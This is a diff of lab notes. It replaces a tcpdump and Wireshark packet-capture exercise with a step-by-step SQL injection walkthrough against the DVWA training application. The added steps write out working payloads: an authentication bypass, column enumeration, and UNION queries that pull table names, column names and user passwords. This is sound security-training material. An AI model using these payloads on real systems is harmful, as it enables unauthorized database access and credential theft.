@@ -1,26 +1,45 @@
-packetcapture
 
-Start a local HTTP server on port 8080 using : 
-python3 -m http.server 8080 
 
-In another new terminal start packet capture: 
-sudo tcpdump -i any -w capture.pcap port 8080 
 
- Open Firefox in kali Linux and go to: 
-http://localhost:8080 
-Refresh the page to generate traffic. 
+Step 1: Navigate to SQL Injection Module
+DVWA → Vulnerabilities → SQL Injection
 
-Go back to tcpdump terminal. 
-Stop packet capturing by using Ctrl + C. 
+Step 2: Normal Input
+Enter:
+1
 
-• Click the Kali Linux dragon icon (top left). 
-•  Type: File Manager and open it. 
-•  Your Home folder will open. 
-• You will see the file: capture.pcap. 
+Displays user details normally.
 
- Since Wireshark is pre-installed in Kali, just double-click capture.pcap. 
-• The file will open directly in Wireshark for analysis
+Step 3: Authentication Bypass
+Enter:
+1' OR '1'='1
 
-In Wireshark filter bar, type: http.request.method == "GET" 
+Result:
+All user records displayed.
 
-Click on any one of the packet and the following data is displayed.
+Step 4: Find Number of Columns
+1' ORDER BY 1-- -
+1' ORDER BY 2-- -
+1' ORDER BY 3-- -
+
+Stop when error occurs.
+Last successful number = total columns.
+
+Step 5: UNION Based Injection
+1' UNION SELECT 1,2-- -
+
+Step 6: Extract Database Name
+1' UNION SELECT database(),2-- -
+
+Step 7: Extract Table Names
+1' UNION SELECT table_name,2
+FROM information_schema.tables
+WHERE table_schema=database()-- -
+
+Step 8: Extract Column Names
+1' UNION SELECT column_name,2
+FROM information_schema.columns
+WHERE table_name='users'-- -
+
+Step 9: Extract Username & Password
+1' UNION SELECT user,password FROM users-- -
